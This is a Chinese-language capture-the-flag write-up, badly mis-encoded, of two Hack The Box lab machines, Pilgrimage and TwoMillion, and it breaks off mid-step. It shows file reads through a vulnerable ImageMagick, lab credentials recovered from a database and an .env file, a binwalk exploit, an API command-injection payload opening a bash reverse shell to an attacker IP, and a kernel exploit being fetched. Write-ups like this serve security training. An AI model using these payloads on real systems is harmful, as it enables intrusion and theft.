identifyå‘½ä»¤é€šå¸¸ç”¨äºè¯†åˆ«å’Œæ˜¾ç¤ºå›¾åƒæ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ ¼å¼ã€åˆ†è¾¨ç‡ã€è‰²å½©æ·±åº¦ç­‰;-verboseå‚æ•°ç”¨äºæ˜¾ç¤ºæ›´è¯¦ç»†çš„å›¾åƒä¿¡æ¯ï¼ŒåŒ…æ‹¬åƒç´ å€¼ã€é¢œè‰²æ·±åº¦ã€å‹ç¼©ç±»å‹ç­‰ã€‚ä½¿ç”¨-verboseå‚æ•°å¯ä»¥è·å–æ›´å…¨é¢çš„å›¾åƒæ–‡ä»¶ä¿¡æ¯ã€‚ grepå·¥å…·ï¼Œå…¶ä¸­-På‚æ•°è¡¨ç¤ºä½¿ç”¨Perlå…¼å®¹çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ-vå‚æ•°è¡¨ç¤ºåå‘åŒ¹é…ï¼Œå³åŒ¹é…ä¸åŒ…å«æŒ‡å®šæ¨¡å¼çš„è¡Œã€‚ æ­£åˆ™è¡¨è¾¾å¼â€^( |Image)â€çš„æ„æ€æ˜¯åŒ¹é…ä»¥ç©ºæ ¼æˆ–è€…â€Imageâ€å¼€å¤´çš„è¡Œã€‚å› æ­¤ï¼Œæ•´ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯ä»è¾“å…¥ä¸­è¿‡æ»¤æ‰ä»¥ç©ºæ ¼æˆ–â€Imageâ€å¼€å¤´çš„è¡Œï¼Œåªæ˜¾ç¤ºä¸åŒ¹é…è¿™ä¸ªæ¨¡å¼çš„è¡Œã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142identify -verbose 65b098f813ad9.png|grep -Pv &quot;^( |Image)&quot; 726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a è¿›è¡Œhexè§£ç å¾—åˆ°å¦‚ä¸‹ 123456789101112131415161718192021222324252627root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:103:109::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinemily:x:1000:1000:emily,,,:/home/emily:/bin/bashsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologin_laurel:x:998:998::/var/log/laurel:/bin/false å…¶ä¸­æ˜æ˜¾å­˜åœ¨ä¸€ä¸ªç”¨æˆ·:emily åœ¨register.phpä¸­å¯ä»¥çŸ¥é“æ•°æ®åº“ä¸ºsqliteä¸”æ–‡ä»¶è·¯å¾„ä¸º/var/db/pilgrimage 12345678#register.phpif ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['username'] &amp;&amp; $_POST['password']) { $username = $_POST['username']; $password = $_POST['password']; $db = new PDO('sqlite:/var/db/pilgrimage'); $stmt = $db-&gt;prepare(&quot;INSERT INTO `users` (username,password) VALUES (?,?)&quot;); $status = $stmt-&gt;execute(array($username,$password)); å°è¯•å¾—åˆ°â€/var/db/pilgrimageâ€æ–‡ä»¶,é‡å¤ä¸Šé¢çš„æ“ä½œï¼Œä¸Šä¼ å›¾åƒå¹¶ä¸‹è½½ï¼› 1cargo run &quot;/var/db/pilgrimage&quot; 12345identify -verbose 65b09b31d31ba.png| grep -Pv &quot;^( |Image)&quot;53514c69746520666f726d617420330010000101004020200000007c000000050000000000000000000000040000000400000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000007c002e4b910d0ff800040***** å› ä¸ºå®ƒæ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶ä¸”è„šæœ¬ä¼¼ä¹åªæ”¯æŒ ASCII æ–‡æœ¬ã€‚æˆ‘å¯ä»¥æ‰‹åŠ¨ä»æ–‡ä»¶ä¸­è·å–æ•°æ®ã€‚æˆ‘å°†ä»ç½‘ç«™ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œå¹¶ç¨å¾®ä½¿ç”¨ä¸€ä¸‹grepï¼Œæˆ‘å¯ä»¥ä»…éš”ç¦»å¸¦æœ‰åå…­è¿›åˆ¶æ•°æ®çš„è¡Œï¼Œç„¶åä½¿ç”¨xxdå°†å…¶è½¬æ¢å›äºŒè¿›åˆ¶ï¼š 1identify -verbose 65b09b31d31ba.png| grep -Pv &quot;^( |Image)&quot;| xxd -r -p &gt; pilgrimage.sqlite ä½¿ç”¨äº†xxdå·¥å…·ï¼Œ-rå‚æ•°è¡¨ç¤ºå°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œ-på‚æ•°è¡¨ç¤ºä½¿ç”¨ç®€æ´æ¨¡å¼ï¼ˆä¸è¾“å‡ºåœ°å€å’ŒASCIIç ï¼‰ï¼Œ&gt;è¡¨ç¤ºå°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶pilgrimage.sqliteä¸­ã€‚ pilgrimage.sqliteçš„usersè¡¨ä¸­å‘ç°ç”¨æˆ·emilyçš„å¯†ç ï¼Œ 12345678chmod +x ./pilgrimage.sqlite sqlite3 pilgrimage.sqlite SQLite version 3.43.1 2023-09-11 12:01:27Enter &quot;.help&quot; for usage hints.sqlite&gt; .tablesimages users sqlite&gt; select * from users;emily|abigchonkyboi123 sshè¿æ¥ 12ssh emily@10.10.11.219password:abigchonkyboi123 binwalkæƒé™æ£€æŸ¥ 123emily@pilgrimage:~$ sudo -l [sudo] password for emily: Sorry, user emily may not run sudo on pilgrimage. find / -perm -u=s -type f 2&gt;/dev/nullä¹Ÿæ— æœä¹‹åæŸ¥çœ‹rootè¿›ç¨‹ï¼› 1234567ps -aux|grep rootroot 765 0.0 0.0 6816 2844 ? Ss Nov09 0:00 /bin/bash /usr/sbin/malwarescan.shroot 766 0.0 0.0 0 0 ? S Nov09 0:00 [hwmon1] root 771 0.0 0.6 209752 27736 ? Ss Nov09 1:07 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)root 773 0.0 0.1 220796 6840 ? Ssl Nov09 0:00 /usr/sbin/rsyslogd -n -iNONE root 775 0.0 0.0 2516 720 ? S Nov09 0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/root 776 0.0 0.0 6816 2288 ? S Nov09 0:00 /bin/bash /usr/sbin/malwarescan.sh æ ¹æ­£åœ¨è¿è¡Œ/usr/sbin/malwarescan.shã€‚è¿˜æœ‰ä¸€ä¸ªinotifywaitæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ­£åœ¨ç›‘è§†è¦åœ¨ç›®å½•ä¸­åˆ›å»ºçš„æ–‡ä»¶/var/www/pilgrimage.htb/shrunkã€‚inotifywaitæ˜¯ä¸€ç§æ¯å½“æ–‡ä»¶ç³»ç»Ÿä¸Šå‘ç”ŸæŸäº›äº‹ä»¶æ—¶è§¦å‘è¿›ç¨‹çš„æ–¹æ³•ã€‚ /usr/sbin/malwarescan.shå†…å®¹å¦‚ä¸‹ 123456789101112131415#!/bin/bashblacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')&quot; binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot; for banned in &quot;${blacklist[@]}&quot;; do if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then /usr/bin/rm &quot;$filename&quot; break fi donedone inotifywaitæ˜¯ä¸€ä¸ªLinuxå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç›‘è§†æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶ã€‚å®ƒä¾èµ–äºLinuxå†…æ ¸æä¾›çš„inotifyæ¥å£ï¼Œå¯ä»¥ç›‘è§†æ–‡ä»¶æˆ–ç›®å½•çš„å˜åŒ–ï¼Œæ¯”å¦‚æ–‡ä»¶çš„åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ã€ç§»åŠ¨ç­‰æ“ä½œã€‚å½“æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å‘ç”Ÿå˜åŒ–æ—¶ï¼Œinotifywaitå¯ä»¥ç«‹å³å“åº”å¹¶æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œæ¯”å¦‚è¿è¡Œç‰¹å®šçš„å‘½ä»¤æˆ–è„šæœ¬ Binwalk æ˜¯ä¸€ä¸ªç”¨äºæœç´¢ç»™å®šäºŒè¿›åˆ¶å›¾åƒä¸­åµŒå…¥æ–‡ä»¶å’Œå¯æ‰§è¡Œä»£ç çš„å·¥å…·ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒè®¾è®¡ç”¨äºè¯†åˆ«å›ºä»¶æ˜ åƒä¸­åµŒå…¥çš„æ–‡ä»¶å’Œä»£ç ã€‚ å‘ç°çš„Binwalkç‰ˆæœ¬ä¸º2.3.2ï¼Œè¯¥ç‰ˆæœ¬å­˜åœ¨å…è®¸ä»»æ„ä»£ç æ‰§è¡Œçš„æ¼æ´CVE-2022-4510ã€‚æˆ‘ä»¬å°†åˆ©ç”¨æ­¤æ¼æ´æ¥å‡çº§æˆ‘ä»¬çš„è®¿é—®æƒé™ã€‚ åˆ©ç”¨poc 1python3 exp.py image.png 10.10.16.8 5555 å°†ç”Ÿæˆçš„â€binwalk_exploit.pngâ€ä¸Šä¼ åˆ°â€/var/www/pilgrimage.htb/shrunk/â€œç›®å½•ä¸‹ 1python3 -m http.server 1wget http://10.10.16.8:8000/binwalk_exploit.png æœ¬åœ°ç›‘å¬å¾—åˆ°åå¼¹shell 1nc -lnvp 5555 æ€»ç»“ä½¿ç”¨nmapæ‰«æå‡º80ç«¯å£å’Œgitæ³„éœ²;å®¡è®¡æºç ï¼›å‘ç°ä¸Šä¼ åçš„æ–‡ä»¶ä¼šç»è¿‡magickå¤„ç†ï¼Œè€Œgitæ³„éœ²äº†magickäºŒè¿›åˆ¶æ–‡ä»¶ï¼›magick --versionå‘ç°æ­¤ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼›åœ¨æºç ä¸­å‘ç°äº†æ•°æ®åº“sqliteçš„æ•°æ®åº“æ–‡ä»¶è·¯å¾„ï¼Œé€šè¿‡magickæ³„éœ²å‡ºæ•°æ®åº“æ–‡ä»¶ï¼›ä»ä¸­å‘ç°äº†ç”¨æˆ·ååŠå¯†ç :emily|abigchonkyboi123;sshè¿æ¥åï¼Œå¸¸è§„æƒé™æ£€æŸ¥å¹¶æ²¡æœ‰å‘ç°å¯åˆ©ç”¨ç‚¹ï¼Œé€šè¿‡æŸ¥æ‰¾rootç”¨æˆ·è¿›ç¨‹ï¼Œ/usr/sbin/malwarescan.shä¸­æ‰§è¡Œè¿™binwalk -e $filenameæ“ä½œï¼Œå¹¶ä¸”binwalkç‰ˆæœ¬ä¸º2.3.2å­˜åœ¨ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼›æœ€ç»ˆåˆ©ç”¨æ­¤æ¼æ´ææƒæˆåŠŸ","link":"/2024/01/24/Pilgrimage(HTB)/"},{"title":"TwoMillion(HTB)","text":"ä¿¡æ¯æœé›†nmap1234567891011121314151617181920212223242526272829303132333435â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -p- -min-rate 10000 10.10.11.221[sudo] kali çš„å¯†ç ï¼šStarting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CSTNmap scan report for 2million.htb (10.10.11.221)Host is up (0.078s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo nmap -sT -sV -sC -O -p80,22 10.10.11.221Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-26 16:03 CSTNmap scan report for 2million.htb (10.10.11.221)Host is up (0.13s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp open http nginx| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-trane-info: Problem with XML parsing of /evox/about|_http-title: Hack The Box :: Penetration Testing LabsWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ç›®å½•å’Œå­åŸŸåæ‰«ææ— æœ 1sudo dirsearch -u http://2million.htb ä»nmapæ‰«æçš„ä¿¡æ¯å¾—åˆ°ä¸»åŸŸå 1sudo echo &quot;10.10.11.221 2million.htb&quot; &gt;&gt; /etc/hosts www-dataé‚€è¯·ç ç‚¹å‡»joinä¼šé‡å®šå‘åˆ°/invite è¦æ±‚è¾“å…¥é‚€è¯·ç  æ³¨å†ŒåŠŸèƒ½ä¹Ÿéœ€è¦é‚€è¯·ç æ‰èƒ½æ³¨å†Œ F12åœ¨inviteé¡µé¢ä¸­ä¼šå‘ç°ä¸€ä¸ªåä¸ºinviteapi.min.jsçš„jsæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š å³ä½¿åšäº†jsæ··æ·†ï¼Œä¹Ÿå¯ä»¥æ˜æ˜¾çœ‹åˆ°verifyInviteCodeå’ŒmakeInviteCodeå‡½æ•° 1eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{})) å°è¯•åœ¨æ§åˆ¶å°ä¸­æ‰§è¡Œâ€inviteapi.min.jsâ€æ–‡ä»¶ä¸­çš„makeInviteCodeå‡½æ•° 1Object { data: &quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr&quot;, enctype: &quot;ROT13&quot; } rot13åœ¨çº¿è§£å¯†å¾—åˆ° 1In order to generate the invite code, make a POST request to /api/v1/invite/generate POSTè¯·æ±‚ï¼Œåœ¨base64è§£å¯†ï¼ŒæˆåŠŸå¾—åˆ°é‚€è¯·ç  1234567â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ curl -X POST http://2million.htb/api/v1/invite/generate{&quot;0&quot;:200,&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot;,&quot;format&quot;:&quot;encoded&quot;}} (kaliã‰¿kali)-[~]â””â”€$ echo &quot;SUFGNE4tN1FHSVEtN0o3WUYtUThBVjA=&quot; | base64 -dIAF4N-7QGIQ-7J7YF-Q8AV0 åœ¨/inviteè¾“å…¥é‚€è¯·ç ä¼šé‡å®šå‘åˆ°/registerï¼Œå¹¶ä¸”é‚€è¯·ç å¡«å……åˆ°äº†é‡Œé¢ï¼› éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå¹¶ç™»å½• è·å¾—ç®¡ç†å‘˜æƒé™/home/accessç‚¹å‡»â€Connection Packâ€æŠ“åŒ…ï¼Œå‘ç°ä¸€ä¸ªä¸‹è½½ovpnæ–‡ä»¶çš„apiï¼› apiæ¼æ´å¸¸è§„æµ‹è¯•ï¼š 123GET /api/v1/user/vpn HTTP/1.1GET /api/v1/user HTTP/1.1GET /api/v1 HTTP/1.1 å‘ç°/api/v1æœ‰å†…å®¹ï¼›å†…å®¹æ˜¯æ‰€æœ‰çš„apiæ¥å£ä»¥åŠæ¥å£çš„ä½œç”¨ 12345678910111213141516171819202122232425262728293031{ &quot;v1&quot;:{ &quot;user&quot;:{ &quot;GET&quot;:{ &quot;\\/api\\/v1&quot;:&quot;Route List&quot;, &quot;\\/api\\/v1\\/invite\\/how\\/to\\/generate&quot;:&quot;Instructions on invite code generation&quot;, &quot;\\/api\\/v1\\/invite\\/generate&quot;:&quot;Generate invite code&quot;, &quot;\\/api\\/v1\\/invite\\/verify&quot;:&quot;Verify invite code&quot;, &quot;\\/api\\/v1\\/user\\/auth&quot;:&quot;Check if user is authenticated&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/generate&quot;:&quot;Generate a new VPN configuration&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/regenerate&quot;:&quot;Regenerate VPN configuration&quot;, &quot;\\/api\\/v1\\/user\\/vpn\\/download&quot;:&quot;Download OVPN file&quot; }, &quot;POST&quot;:{ &quot;\\/api\\/v1\\/user\\/register&quot;:&quot;Register a new user&quot;, &quot;\\/api\\/v1\\/user\\/login&quot;:&quot;Login with existing user&quot; } }, &quot;admin&quot;:{ &quot;GET&quot;:{ &quot;\\/api\\/v1\\/admin\\/auth&quot;:&quot;Check if user is admin&quot; }, &quot;POST&quot;:{ &quot;\\/api\\/v1\\/admin\\/vpn\\/generate&quot;:&quot;Generate VPN for specific user&quot; }, &quot;PUT&quot;:{ &quot;\\/api\\/v1\\/admin\\/settings\\/update&quot;:&quot;Update user settings&quot; } } }} æˆ‘ä»¬çš„è´¦å·åªæ˜¯æ™®é€šç”¨æˆ·ï¼› è¿”å›401 Unauthorized,çœ‹æ¥æ˜¯æ²¡æœ‰æƒé™ æœ€ç»ˆå‘ç°/api/v1/admin/vpn/generateAPIæ¥å£å¯ä»¥å°†ç”¨æˆ·å¸æˆ·æ›´æ”¹ä¸ºç®¡ç†å‘˜å¸æˆ· è¿”å›é”™è¯¯çš„æ•°æ®ç±»å‹ æ·»åŠ â€Content-type: application/jsonâ€ï¼Œè¿”å›ç¼ºå°‘å‚æ•° â€œemailâ€ æ·»åŠ ä¸€æ¡â€emailâ€æ•°æ®ï¼Œè¿”å›ç¼ºå°‘æ­¤å‚æ•°â€œis_adminâ€ è¿”å›â€œis_adminâ€åªèƒ½ä¸º0æˆ–1 æœ€ç»ˆæˆåŠŸä¿®æ”¹ä¸ºadminè´¦å· å‘½ä»¤æ³¨å…¥/api/v1/admin/vpn/generatä¹Ÿæ˜¯ç”Ÿæˆovpnæ–‡ä»¶çš„æ¥å£ï¼›ç”Ÿæˆ VPN å¯†é’¥çš„å¯èƒ½ä¸æ˜¯ PHP ä»£ç ï¼Œè€Œæ˜¯ä¸€äº›ç”Ÿæˆ VPN å¯†é’¥å¿…è¦ä¿¡æ¯çš„ Bash å·¥å…·ã€‚å€¼å¾—æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å‘½ä»¤æ³¨å…¥ã€‚ å¦‚æœæœåŠ¡å™¨æ­£åœ¨æ‰§è¡Œç±»ä¼¼çš„æ“ä½œgen_vpn.sh [username]ï¼Œé‚£ä¹ˆæˆ‘å°†å°è¯•;åœ¨ç”¨æˆ·åä¸­æ”¾å…¥usernameä¸­ä»¥å°†å…¶åˆ†è§£ä¸ºæ–°å‘½ä»¤ã€‚æˆ‘è¿˜å°†#åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªä»¥æ³¨é‡Šæ‰æˆ‘è¾“å…¥åå¯èƒ½å‡ºç°çš„ä»»ä½•å†…å®¹ï¼›ç„¶åå‘ç°/api/v1/admin/vpn/generateæ¥å£å­˜åœ¨å‘½ä»¤æ³¨å…¥ åå¼¹ä¸€ä¸ªshellåˆ°æ”»å‡»æœº 1nc -lnvp 5555 POSTè¯·æ±‚æ•°æ®å¦‚ä¸‹ 123{&quot;username&quot;:&quot;test; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.17/5555 0&gt;&amp;1';#&quot;} æˆåŠŸåå¼¹shellå,å­˜åœ¨ä¸€ä¸ªadminç”¨æˆ· 12www-data@2million:~/html$ ls -l /homedrwxr-xr-x 6 admin admin 4096 Jan 26 07:50 admin åœ¨webåº”ç”¨é»˜è®¤ç›®å½•ä¸‹çš„.envæ–‡ä»¶ä¸­å‘ç°ç”¨æˆ·adminçš„æ•°æ®åº“å¯†ç ï¼Œ 123456w-data@2million:~/html$ cat .envcat .envDB_HOST=127.0.0.1DB_DATABASE=htb_prodDB_USERNAME=adminDB_PASSWORD=SuperDuperPass123 ä¼ªç»ˆç«¯ï¼Œè¿æ¥æ•°æ®åº“ï¼Œåœ¨æ•°æ®åº“ä¸­å¹¶æ²¡æœ‰æ‰¾åˆ°å¯åˆ©ç”¨çš„ä¿¡æ¯ï¼Œ 1python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot; å°è¯•åˆ©ç”¨æ•°æ®åº“å¯†ç è¿æ¥adminçš„ssh 12ssh admin@10.10.11.221password:SuperDuperPass123 user_adminsshè¿æ¥æˆåŠŸï¼Œä½†æ˜¯åœ¨è¿æ¥sshçš„æ—¶å€™ï¼Œæœ‰è¿™æ ·ä¸€äº›ä¿¡æ¯ 12You have mail.Last login: Fri Jan 26 08:53:41 2024 from 10.10.14.6 åˆ©ç”¨findå‘½ä»¤æŸ¥æ‰¾æœ‰å…³â€™mailâ€™çš„æ–‡ä»¶ 1234567admin@2million:~$ find / -name &quot;mail&quot; 2&gt;/dev/null/snap/core20/1891/var/mail/snap/core20/1891/var/spool/mail/var/spool/mail/var/mail/usr/lib/python3/dist-packages/twisted/mail/usr/lib/byobu/mail æ ¹æ®æ¯ä¸ªç›®å½•çš„ä½œç”¨ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šåœ¨â€™/varâ€™ç›®å½•ä¸‹ ä»ä¸­æœ‰ä¸€äº›å…³é”®è¯OverlayFS / FUSEè¯´æ˜è¿™å°æœºå™¨çš„å†…æ ¸ä¼šå—åˆ°å½±å“ 1234567891011121314admin@2million:~$ cat /var/mail/admin From: ch4p &lt;ch4p@2million.htb&gt;To: admin &lt;admin@2million.htb&gt;Cc: g0blin &lt;g0blin@2million.htb&gt;Subject: Urgent: Patch System OSDate: Tue, 1 June 2023 10:45:22 -0700Message-ID: &lt;9876543210@2million.htb&gt;X-Mailer: ThunderMail Pro 5.2Hey admin,I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.HTB Godfather user_rootæˆ‘åªæ˜¯æŠŠå…³é”®è¯æ”¾åˆ°googleï¼›åé¢ä¸€äº›å†…å®¹å·²ç»æš´éœ²äº† ä¸€äº›exploit å…¶ä¸­æ’åœ¨googleç¬¬ä¸€ä¸ªçš„å°±æ˜¯cve-2023-0386,æ–‡ç« ä¸­è¡¨æ˜ï¼šå¦‚æœç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬ä½äº 6.2ï¼Œåˆ™è¯¥ç³»ç»Ÿå¯èƒ½å®¹æ˜“å—åˆ°æ”»å‡»ã€‚ 1234567admin@2million:~$ uname -aLinux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxadmin@2million:~$ cat /etc/lsb-release DISTRIB_ID=UbuntuDISTRIB_RELEASE=22.04DISTRIB_CODENAME=jammyDISTRIB_DESCRIPTION=&quot;Ubuntu 22.04.2 LTS&quot; åœ¨ GitHub ä¸Šæä¾›äº†é’ˆå¯¹æ­¤æ¼æ´çš„ POCã€‚è™½ç„¶å†…å®¹README.mdå¾ˆå°‘ï¼Œä½†æä¾›äº†è¶³å¤Ÿçš„ä½¿ç”¨è¯´æ˜ã€‚ æˆ‘ä½¿ç”¨gitå…‹éš†åˆ°æˆ‘æœ¬åœ°ï¼Œå†ç”¨pythonæœåŠ¡å°†pocä¸Šä¼ åˆ°ç›®æ ‡æœºä¸Š 1python3 -m http.server 1wget -r http://10.10.16.17:8000/CVE-2023-0386 å†è·Ÿç€readme.mdæ“ä½œï¼› ç¼–è¯‘ 1make all ä½¿ç”¨ 